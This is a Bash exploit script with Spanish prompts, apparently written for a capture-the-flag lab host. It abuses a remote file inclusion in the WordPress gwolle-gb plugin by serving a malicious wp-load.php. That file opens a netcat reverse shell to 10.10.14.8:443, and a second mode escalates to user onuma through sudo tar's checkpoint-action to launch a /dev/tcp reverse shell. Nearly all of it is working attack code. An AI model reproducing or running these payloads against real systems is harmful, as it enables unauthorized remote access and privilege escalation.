#!/bin/bash

function ctrl_c(){
    echo -e "\n\n[!] Saliendo ...\n"
    exit 1
}

# Ctrl+C
trap ctrl_c INT

# ./exploit.sh -u www-data/onuma

function helpPanel(){
    echo -e "\n[!] Uso: $0 -u www-data/onuma\n"
    exit 1
}

function makeWWWDataFile(){
cat << EOF > wp-load.php
<?php
    system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f");
?>
EOF
}

function makeOnumaFile(){
cat << EOF > wp-load.php
<?php
    system("echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.8/443 0>&1' > /dev/shm/s4vishell.sh");
    system("sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=\"bash /dev/shm/s4vishell.sh\"");
?>
EOF
}

function makeRequest(){
    if [ "$(echo $username)" == "www-data" ]; then
        makeWWWDataFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    elif [ "$(echo $username)" == "onuma" ]; then
        makeOnumaFile
        python3 -m http.server 80 &>/dev/null &
        curl -s -X GET "http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.8/"
        rm wp-load.php
        kill -9 $(lsof -i:80 | grep "python" | awk '{print $2}') &>/dev/null
    else
        echo -e "\n[!] El usuario es invÃ¡lido\n"
        exit 1
    fi
}

declare -i parameter_counter=0; while getopts ":u:h:" arg; do
    case $arg in
        u) username=$OPTARG; let parameter_counter+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_counter -eq 0 ]; then
    helpPanel
else
    makeRequest
fi
